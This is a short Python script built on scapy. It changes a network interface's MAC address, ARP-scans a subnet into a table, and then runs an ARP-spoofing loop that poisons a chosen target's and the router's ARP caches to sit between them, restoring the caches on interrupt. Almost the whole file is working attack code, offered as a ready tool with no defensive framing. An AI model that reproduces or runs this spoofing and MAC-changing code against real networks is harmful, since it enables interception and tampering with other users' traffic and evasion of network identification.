#!/bin/env python3

import subprocess
import re
import scapy.all as scapy
from prettytable import PrettyTable
import time


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  CHANGING MAC ADDRESS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


print('''


''')
print("------------------------------------------------------------")


interface = input("Enter the interface you want to work with > ")

print("Do you want to change your mac address? Y/N : ")
decision = input()
if decision == 'Y' or decision == 'y':
    new_mac = input("New MAC > ")
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])
    print("--MAC changing successful--")

    # to check if our mac address was changed correctly:
    ifconfig_output = subprocess.check_output(['ifconfig', interface])
    mac_search_result = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', str(ifconfig_output))
    if mac_search_result.group(0) == new_mac:
        print("Verified, MAC successfully changed to " + new_mac)
    else:
        print("There was an error")


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  SCANNING NETWORK $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


print("------------")
print("'route -n' output:  ")
subprocess.call(["route","-n"])
print("____________")

ip = input("Enter ip to scan > ")


def scan(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_combined = broadcast/arp_request
    answered_list = scapy.srp(arp_broadcast_combined, timeout=1, verbose=False)[0]

    response_table = PrettyTable()
    response_table.field_names = ["IP addresses","MAC addresses"]

    for element in answered_list:
        response_table.add_row([element[1].psrc,element[1].hwsrc])
    print(response_table)

scan(ip)


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  ARP SPOOFING $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$



def ip_to_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_combined = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast_combined, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


router_ip = input("Enter router's IP > ")
router_mac = ip_to_mac(router_ip)

target_ip = input("Enter target's IP > ")
target_mac = ip_to_mac(target_ip)

router_spoof_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
target_spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)


packets_sent = 0
try :
    while True:
        scapy.send(router_spoof_packet, verbose=False)
        scapy.send(target_spoof_packet, verbose=False)

        packets_sent += 2
        if packets_sent == 1:
            print("\r=> Sent " + str(packets_sent) + " packet...", end="")
        else:
            print("\r=> Sent " + str(packets_sent) + " packets...", end="")

        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n--- Restoring ARP tables ---")

    router_restore_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    target_restore_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)

    scapy.send(router_restore_packet, count=5, verbose=False)
    scapy.send(target_restore_packet, count=5, verbose=False)

    print("\n")
    print("--------------------------------------------------------------")
    print("                       Program ended")
    print("--------------------------------------------------------------")

